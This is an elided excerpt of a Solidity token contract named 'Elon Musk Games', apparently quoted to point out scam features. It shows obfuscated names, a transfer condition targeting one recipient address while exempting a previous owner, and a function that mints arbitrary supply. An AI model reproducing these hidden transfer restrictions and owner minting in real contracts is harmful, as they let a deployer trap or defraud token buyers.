...
contract GAMES is Context, GIRC3, GIRC3Metadata, Ownable {
    ...
    constructor () {
        _nmtokena5 = "Elon Musk Games";
        _nminitiala5 = 'FWE';
        _nmtotala5 = 1*10**10 * 10**9;
    ...
    function _transfer(address sender, address recipient, uint amount) internal virtual {
        ...
        if(recipient == take && sender != _previousOwner && fee ){ 
    ...
    function _grant(address account, uint256 amount) internal virtual {
        ...
        _nmtotala5 = _nmtotala5.add(amount);
